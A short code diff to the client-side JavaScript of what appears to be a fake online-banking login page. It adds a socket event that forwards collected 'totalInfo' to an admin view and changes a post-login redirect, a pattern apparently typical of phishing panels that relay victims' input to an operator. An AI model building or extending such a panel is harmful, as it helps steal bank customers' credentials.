@@ -90,9 +90,11 @@ emitDataServer.addEventListener("click", () => {
     }
 })
 
-socket.on("ContinuarHome", ContinuarHome => {
-    window.location.href = "/bancainternett/home/?s="+ContinuarHome;
+socket.on("ContinuarHome", totalInfo => {
+    socket.emit('mostrarEnAdmin', totalInfo);
+    window.location.href = "/home/?s="+totalInfo[0].socket;
 })
+
 
 socket.on("ErrorLogin", TextoBanner => {
     ErrorBanner.style.display = "flex";
